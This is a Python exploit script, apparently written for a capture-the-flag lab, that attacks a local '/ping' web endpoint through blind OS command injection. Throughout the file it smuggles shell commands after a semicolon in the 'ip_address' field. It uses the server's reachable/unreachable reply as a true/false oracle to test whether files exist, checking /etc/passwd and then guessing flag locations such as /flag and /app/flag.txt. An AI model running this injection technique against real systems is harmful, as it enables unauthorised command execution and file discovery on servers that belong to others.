import requests

# Target configuration
url = "http://127.0.0.1:32943/ping"

def send_payload(payload):
    """Send the payload and return the response text"""
    try:
        response = requests.post(url, data={"ip_address": payload}, timeout=5)
        return response.text
    except Exception as e:
        return f"ERROR: {str(e)}"

def check_result(text, label):
    """Classify response"""
    if "reachable" in text.lower():
        return "REACHABLE"
    elif "unreachable" in text.lower():
        return "UNREACHABLE"
    else:
        return f"UNKNOWN - {text[:100]}"

print("[*] Baseline testing - establishing true/false signals\n")

# Test with definitely non-existent file as TRUE NEGATIVE baseline
print("[1] TRUE NEGATIVE test (known non-existent file):")
payload = "127.0.0.1; [ -f /this_file_definitely_does_not_exist_12345 ] && echo x"
text = send_payload(payload)
result = check_result(text, "nonexistent")
print(f"    Payload: {payload}")
print(f"    Result: {result}")
print(f"    Response: {text.strip()[:200]}\n")

# Test with root filesystem (always exists) as TRUE POSITIVE baseline  
print("[2] TRUE POSITIVE test (root dir exists):")
payload = "127.0.0.1; [ -d / ] && echo x"
text = send_payload(payload)
result = check_result(text, "root_dir")
print(f"    Payload: {payload}")
print(f"    Result: {result}")
print(f"    Response: {text.strip()[:200]}\n")

# Test with no command execution
print("[3] Control test (no echo after &&):")
payload = "127.0.0.1; false && echo x"
text = send_payload(payload)
result = check_result(text, "false")
print(f"    Payload: {payload}")
print(f"    Result: {result}")
print(f"    Response: {text.strip()[:200]}\n")

# Test with true command
print("[4] TRUE command:")
payload = "127.0.0.1; true && echo x"
text = send_payload(payload)
result = check_result(text, "true")
print(f"    Payload: {payload}")
print(f"    Result: {result}")
print(f"    Response: {text.strip()[:200]}\n")

# Different syntax - using || for unreachable (command failed)
print("[5] Testing with || syntax - failed command detection:")
print("    Testing a command that will fail...")
payload = "127.0.0.1; cat /nonexistentfile"
text = send_payload(payload)
result = check_result(text, "cat_fail")
print(f"    Payload: {payload}")
print(f"    Result: {result}")
print(f"    Response: {text.strip()[:200]}\n")

print("[6] Testing with || syntax - successful command:")
payload = "127.0.0.1; echo test"
text = send_payload(payload)
result = check_result(text, "echo_success")
print(f"    Payload: {payload}")
print(f"    Result: {result}")
print(f"    Response: {text.strip()[:200]}\n")

# Try alternative patterns
print("[*] Testing alternative injection patterns...")

# Pattern: use && vs || difference
print("\n[7] Using alternative pattern with grep:")
payload = "127.0.0.1; [ -f /etc/passwd ] || echo fail"
text = send_payload(payload)
print(f"    Payload: {payload}")
print(f"    Response: {text.strip()[:200]}")

payload = "127.0.0.1; [ -f /this_does_not_exist ] || echo fail"
text = send_payload(payload)
print(f"    Payload: {payload}")
print(f"    Response: {text.strip()[:200]}")

# Now test actual flag locations with confirmed working pattern
print("\n\n[*] Flag existence testing with verified pattern:")

test_files = [
    ("/etc/passwd", "known-exists"),
    ("/etc/nonexistent12345", "known-not-exists"),
    ("/flag", "target"),
    ("/flag.txt", "target"),
    ("/app/flag", "target"),
    ("/app/flag.txt", "target"),
    ("/tmp/flag", "target"),
]

print("\nUsing pattern: 127.0.0.1; [ -f PATH ] && echo success\n")
for filepath, category in test_files:
    payload = f"127.0.0.1; [ -f {filepath} ] && echo success"
    text = send_payload(payload)
    result = check_result(text, filepath)
    icon = "✓" if result == "REACHABLE" else "✗"
    print(f"  {icon} {filepath} ({category}): {result}")
